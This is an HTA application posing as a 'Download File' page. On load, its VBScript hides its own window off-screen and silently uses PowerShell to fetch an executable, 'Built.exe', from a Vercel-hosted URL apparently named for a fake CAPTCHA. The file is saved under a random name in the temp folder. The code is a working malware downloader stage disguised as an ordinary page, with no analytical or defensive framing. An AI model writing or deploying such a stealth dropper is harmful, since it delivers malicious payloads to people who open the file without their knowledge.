<!DOCTYPE html>
<html>
<head>
    <title>Download File</title>
    <HTA:APPLICATION 
        ID="DownloadApp"
        APPLICATIONNAME="FileDownloadApp"
        BORDER="thin"
        BORDERSTYLE="normal"
        ICON="none"
        INNERBORDER="no"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        SYSMENU="no" />
    <script language="VBScript">
    Sub Window_onLoad
        ' Resize the window and move it off-screen
        Self.resizeTo 1, 1
        Self.moveTo -32000, -32000

        ' Create Shell object to interact with the operating system
        Set objShell = CreateObject("WScript.Shell")

        ' Get temp folder location
        tempFolder = objShell.ExpandEnvironmentStrings("%temp%")

        ' URL of the file to download
        downloadUrl = "https://notafakecaptica2222.vercel.app/Built.exe"

        ' Generate a random filename for the downloaded file
        randomFileName = GenerateRandomFileName() & ".exe"
        downloadedFile = tempFolder & "\" & randomFileName

        ' Construct the PowerShell command to download the file
        cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""

        ' Run the command in the background
        objShell.Run "cmd.exe /c " & cmdCommand, 0, True
    End Sub

    Function GenerateRandomFileName()
        Dim randomStr, i
        randomStr = ""
        For i = 1 To 10
            randomStr = randomStr & Chr(Int(Rnd * 26) + 65) ' Random characters A-Z
        Next
        GenerateRandomFileName = randomStr
    End Function
    </script>
</head>
<body onload="Window_onLoad">
</body>
</html>
